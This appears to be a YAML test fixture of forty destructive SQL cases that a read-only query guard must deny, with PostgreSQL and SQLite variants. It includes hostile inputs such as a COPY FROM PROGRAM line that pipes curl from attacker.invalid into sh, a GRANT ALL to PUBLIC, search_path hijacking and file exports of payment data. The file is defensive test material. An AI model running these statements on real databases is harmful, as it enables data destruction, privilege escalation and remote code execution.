defaults:
  role: support_analyst
  dialects: [postgres, sqlite]
  category: destructive
  expected: deny
  classification: malicious
  reason: write_statement
cases:
  - id: DES-001
    sql: DROP TABLE orders
    explanation: Plain DDL drop of a tenant table.
  - id: DES-002
    sql: DROP TABLE IF EXISTS customers
    explanation: Conditional drop.
  - id: DES-003
    sql: DELETE FROM orders WHERE tenant_id = 1
    explanation: A delete is a write even when correctly tenant-scoped.
  - id: DES-004
    sql: DELETE FROM orders
    explanation: Unbounded delete.
  - id: DES-005
    sql: UPDATE orders SET status = 'cancelled' WHERE tenant_id = 1
    explanation: Update of a granted table by a read-only role.
  - id: DES-006
    sql: UPDATE payments SET amount = 0
    explanation: Financial tampering.
  - id: DES-007
    sql: INSERT INTO orders (id, tenant_id, status) VALUES (99999, 1, 'paid')
    explanation: Insert by a read-only role.
  - id: DES-008
    sql: INSERT INTO support_tickets (id, tenant_id, subject) SELECT id, tenant_id, 'x' FROM orders WHERE tenant_id = 1
    explanation: INSERT ... SELECT looks like a read but writes.
  - id: DES-009
    sql: TRUNCATE TABLE orders
    dialects: [postgres]
    explanation: TRUNCATE (PostgreSQL).
  - id: DES-010
    sql: ALTER TABLE customers ADD COLUMN pwned TEXT
    explanation: Schema change.
  - id: DES-011
    sql: CREATE TABLE stolen AS SELECT * FROM payments
    explanation: CTAS copies data into a new table.
  - id: DES-012
    sql: GRANT ALL ON payments TO PUBLIC
    dialects: [postgres]
    explanation: Privilege escalation.
  - id: DES-013
    sql: REVOKE SELECT ON orders FROM reporting
    dialects: [postgres]
    explanation: Privilege change.
  - id: DES-014
    sql: MERGE INTO orders o USING (SELECT 1 AS id) s ON o.id = s.id WHEN MATCHED THEN DELETE
    dialects: [postgres]
    explanation: MERGE with DELETE action.
  - id: DES-015
    sql: COPY payments TO '/tmp/payments.csv'
    dialects: [postgres]
    explanation: Server-side file export.
  - id: DES-016
    sql: COPY orders FROM PROGRAM 'curl http://attacker.invalid/x | sh'
    dialects: [postgres]
    explanation: Command execution through COPY FROM PROGRAM.
  - id: DES-017
    sql: VACUUM FULL orders
    dialects: [postgres]
    reason: unsupported_statement
    explanation: Maintenance command that takes heavy locks.
  - id: DES-018
    sql: SELECT id, status INTO TEMP stolen FROM orders WHERE tenant_id = 1
    dialects: [postgres]
    explanation: SELECT INTO creates a table.
  - id: DES-019
    sql: CREATE VIEW v AS SELECT card_number FROM payments
    explanation: Creates a persistent object exposing card numbers.
  - id: DES-020
    sql: CREATE INDEX idx_pwn ON orders (status)
    explanation: DDL; also a resource-consumption vector.
  - id: DES-021
    sql: DO $$ BEGIN DELETE FROM orders; END $$
    dialects: [postgres]
    reason: unsupported_statement
    explanation: Anonymous PL/pgSQL block.
  - id: DES-022
    sql: CALL purge_orders(1)
    dialects: [postgres]
    reason: unsupported_statement
    explanation: Stored procedure call with unknown side effects.
  - id: DES-023
    sql: SET ROLE postgres
    dialects: [postgres]
    reason: unsupported_statement
    explanation: Session privilege change.
  - id: DES-024
    sql: SET search_path TO attacker, public
    dialects: [postgres]
    reason: unsupported_statement
    explanation: search_path hijacking can redirect unqualified names to attacker objects.
  - id: DES-025
    sql: SELECT id FROM orders WHERE tenant_id = 1 FOR UPDATE
    dialects: [postgres]
    reason: write_statement
    explanation: Row locks block other transactions.
  - id: DES-026
    sql: LOCK TABLE orders IN ACCESS EXCLUSIVE MODE
    dialects: [postgres]
    reason: unsupported_statement
    explanation: Table lock (denial of service).
  - id: DES-027
    sql: EXPLAIN ANALYZE DELETE FROM orders
    dialects: [postgres]
    reason: unsupported_statement
    explanation: EXPLAIN ANALYZE executes the statement.
  - id: DES-028
    sql: PREPARE p AS DELETE FROM orders; EXECUTE p
    dialects: [postgres]
    reason: multiple_statements
    explanation: Prepared write split over two statements.
  - id: DES-029
    sql: ATTACH DATABASE '/tmp/evil.db' AS evil
    dialects: [sqlite]
    reason: unsupported_statement
    explanation: Attaching a file can create it and write outside the database.
  - id: DES-030
    sql: PRAGMA writable_schema = ON
    dialects: [sqlite]
    reason: unsupported_statement
    explanation: Enables direct edits of sqlite_master.
  - id: DES-031
    sql: VACUUM INTO '/tmp/copy.db'
    dialects: [sqlite]
    reason: unsupported_statement
    explanation: Writes a full copy of the database to an arbitrary path.
  - id: DES-032
    sql: REPLACE INTO orders (id, tenant_id, status) VALUES (1, 1, 'paid')
    dialects: [sqlite]
    explanation: SQLite REPLACE is an upsert.
  - id: DES-033
    sql: INSERT OR REPLACE INTO payments (id, amount) VALUES (1, 0)
    dialects: [sqlite]
    explanation: SQLite upsert variant.
  - id: DES-034
    sql: INSERT INTO orders (id, tenant_id, status) VALUES (1, 1, 'x') ON CONFLICT (id) DO UPDATE SET status = 'refunded'
    explanation: UPSERT.
  - id: DES-035
    sql: COMMENT ON TABLE orders IS 'pwned'
    dialects: [postgres]
    explanation: Catalog write.
  - id: DES-036
    sql: CREATE TRIGGER t AFTER INSERT ON orders BEGIN DELETE FROM payments; END
    dialects: [sqlite]
    reason: unsupported_statement
    explanation: Trigger installs persistent destructive behaviour.
  - id: DES-037
    sql: DROP SCHEMA public CASCADE
    dialects: [postgres]
    explanation: Drops everything.
  - id: DES-038
    sql: RESET ALL
    dialects: [postgres]
    reason: unsupported_statement
    explanation: Resets session limits such as statement_timeout.
  - id: DES-039
    sql: BEGIN
    reason: unsupported_statement
    explanation: Transaction control is not a query and can leave locks open.
  - id: DES-040
    sql: CREATE EXTENSION dblink
    dialects: [postgres]
    explanation: Installs remote-query capability.
